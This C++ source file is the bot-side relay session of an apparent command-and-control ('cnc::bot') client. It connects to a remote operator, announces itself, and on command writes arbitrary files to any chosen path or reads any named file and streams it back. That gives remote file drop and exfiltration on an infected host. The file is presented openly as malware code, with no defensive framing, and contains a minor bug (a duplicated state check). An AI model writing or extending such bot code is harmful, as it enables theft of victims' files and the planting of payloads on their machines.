#include "relay_session.h"
#include <common/serialize_filesystem.h>
#include <fstream>
#include <limits>
#include <cstring>
using namespace cnc;
using namespace cnc::bot;

relay_session::relay_session(boost::asio::io_context &context)
	: m_socket(context)
{

}

relay_session::~relay_session()
{
	close();
}

void relay_session::close()
{
	if (m_state == session_state::CONNECTED)
		m_socket.shutdown(socket_type::shutdown_both);

	m_socket.close();
	m_state = session_state::CLOSED;
}

relay_session::awaitable_type<void> relay_session::connect(socket_type::endpoint_type endpoint, const common::bot_protocol::hello_data &hello_data)
{
	if (m_state == session_state::CONNECTING || m_state == session_state::CONNECTING)
		throw std::runtime_error("invalid state");

	m_state = session_state::CONNECTING;
	auto token = co_await boost::asio::experimental::this_coro::token();
	co_await m_socket.async_connect(endpoint, token);
	auto result = co_await common::cmd_relay_send::hello(m_socket, hello_data);
	if (result.err)
		throw std::runtime_error(result.err_msg);

	m_state = session_state::CONNECTED;
}

relay_session::awaitable_type<std::optional<std::string>> relay_session::listen()
{
	if (m_state != session_state::CONNECTED)
		throw std::runtime_error("invalid session state");

	while (m_state != session_state::STOPPING)
	{
		using types = session_type::header_type::message_type;
		auto header = co_await session_type::recv_header(m_socket);
		switch (header.type())
		{
		case types::RECV_FILE:
		{
			auto msg = co_await session_type::recv_msg(m_socket, header.payload_size());
			auto path = common::deserialize<std::filesystem::path>(msg);
			std::filesystem::create_directories(path.parent_path());
			std::ofstream file(path.native(), std::ios::out | std::ios::binary);
			if (!file)
			{
				std::array<char, 256> error_msg;
				strerror_s(error_msg.data(), error_msg.size(), errno);
				co_await session_type::send_msg(m_socket, types::ERR, error_msg);
				break;
			}

			co_await session_type::send_msg(m_socket, types::OK);

			header = co_await session_type::recv_header(m_socket);
			if (header.type() != types::BLOB)
				throw std::runtime_error("BLOB expected");

			co_await session_type::recv_stream(m_socket, file, header.payload_size());
			break;
		}
		case types::SEND_FILE:
		{
			auto msg = co_await session_type::recv_msg(m_socket, header.payload_size());
			auto path = common::deserialize<std::filesystem::path>(msg);
			std::ifstream file(path.native(), std::ios::in | std::ios::binary);
			if (!file)
			{
				std::array<char, 256> error_msg;
				strerror_s(error_msg.data(), error_msg.size(), errno);
				co_await session_type::send_msg(m_socket, types::ERR, error_msg);
				break;
			}

			co_await session_type::send_msg(m_socket, types::OK);
			auto size = std::filesystem::file_size(path);
			if (size > std::numeric_limits<session_type::header_type::size_type>::max())
				throw std::range_error("file too big");

			co_await session_type::send_stream(m_socket, types::BLOB, file, static_cast<session_type::header_type::size_type>(size));
			break;
		}
		case types::QUIT:
		{
			auto msg = co_await session_type::recv_msg(m_socket, header.payload_size());
			close();
			co_return msg;
		}
		}
	}

	co_await common::cmd_relay_send::quit(m_socket, "session stopped");
	close();

	co_return std::optional<std::string>{};
}

void relay_session::stop() noexcept
{
	if (m_state == session_state::CONNECTED)
		m_state = session_state::STOPPING;
}